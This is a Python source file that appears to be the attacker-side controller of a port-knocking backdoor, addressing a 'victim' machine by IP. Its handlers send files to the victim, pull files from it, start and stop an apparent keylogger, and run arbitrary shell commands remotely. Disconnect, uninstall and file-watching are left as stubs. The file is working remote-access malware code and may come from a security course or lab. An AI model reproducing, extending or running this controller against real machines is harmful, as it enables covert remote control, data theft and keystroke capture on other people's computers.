from pathlib import Path

from mods.knocking import send_port_knocks
from mods.protocol import check_for_ack, send_data, receive_data
from mods.shared import VICTIM_IP, ATTACKER_IP

def handle_command(cmd: str, args: list[str], state: dict) -> str:
    match cmd:
        case 'dc':
            return handle_dc(args, state)
        case 'cn':
            return handle_cn(args, state)
        case 'sf':
            return handle_sf(args)
        case 'dl':
            return handle_dl(args)
        case 'k+':
            return handle_kstart(args, state)
        case 'k-':
            return handle_kstop(args, state)
        case 'wf':
            return handle_wf(args, state)
        case 'wd':
            return handle_wd(args, state)
        case 'rn':
            return handle_rn(args)
        case 'un':
            return handle_un(args, state)
        case _:
            if len(args) > 0:
                args_bytes = b' ' + ' '.join(args).encode()
            else:
                args_bytes = b''
            
            send_data(cmd.encode() + args_bytes, src=ATTACKER_IP, dst=VICTIM_IP)
            return f'Unknown command: {cmd}'


def handle_cn(_: list[str], state: dict) -> str:
    send_port_knocks(dst=VICTIM_IP)
    if not check_for_ack(from_ip=VICTIM_IP, timeout=4):
        return f'Unable to connect to {VICTIM_IP}'
    state['connected_to_victim'] = True
    return f'Connected to {VICTIM_IP}'

def handle_sf(args: list[str]) -> str:
    filepath = Path(args[0])
    if not filepath.is_file():
        return 'Not a valid file path'
    filename = filepath.name
    send_data(b'sf ' + filename.encode(), src=ATTACKER_IP, dst=VICTIM_IP)
    if not check_for_ack(from_ip=VICTIM_IP):
        return 'Victim did not reply in time'
    file_bytes = filepath.read_bytes()
    send_data(file_bytes, src=ATTACKER_IP, dst=VICTIM_IP)
    return f'Sent file: {filename}'

def handle_dl(args: list[str]) -> str:
    raw_path = args[0]
    filepath = Path(raw_path)
    if not filepath.is_file():
        return 'Not a valid file path'
    send_data(b'dl ' + raw_path.encode(), src=ATTACKER_IP, dst=VICTIM_IP)
    if not check_for_ack(from_ip=VICTIM_IP):
        return 'Victim unable to find file'
    file_bytes = receive_data(from_ip=VICTIM_IP)
    with open(f'data_attacker/{filepath.name}', 'wb') as f:
        f.write(file_bytes)
    return f'Downloaded file: {filepath.name}'

def handle_kstart(args: list[str], state: dict) -> str:
    send_data(b'k+', src=ATTACKER_IP, dst=VICTIM_IP)
    file_bytes = receive_data(from_ip=VICTIM_IP)
    return file_bytes.decode()

def handle_kstop(args: list[str], state: dict) -> str:
    send_data(b'k-', src=ATTACKER_IP, dst=VICTIM_IP)
    file_bytes = receive_data(from_ip=VICTIM_IP)
    return file_bytes.decode()

def handle_rn(args: list[str]) -> str:
    run_command = ' '.join(args)
    send_data(b'rn ' + run_command.encode('utf-8'), src=ATTACKER_IP, dst=VICTIM_IP)
    if not check_for_ack(from_ip=VICTIM_IP):
        return f'Victim unable to run command: {run_command}'
    res = receive_data(from_ip=VICTIM_IP)
    return res.decode()

def handle_wf(args: list[str], state: dict) -> str:
    # TODO: Implement watch files command with args[0] having path to file
    return f'Command not supported yet'

def handle_wd(args: list[str], state: dict) -> str:
    # TODO: Implement watch files command with args[0] having path to folder
    return f'Command not supported yet'

def handle_dc(_: list[str], state: dict) -> str:
    # Implement graceful disconnect. Not much to be done here as there is no socket connection to close
    # but should probably communicated to the victim to go back to listening for port knocks.
    return f'Command not supported yet'

def handle_un(_: list[str], state: dict) -> str:
    # Implement uninstall command. Result should be that the victim program is no longer running.
    return f'Command not supported yet'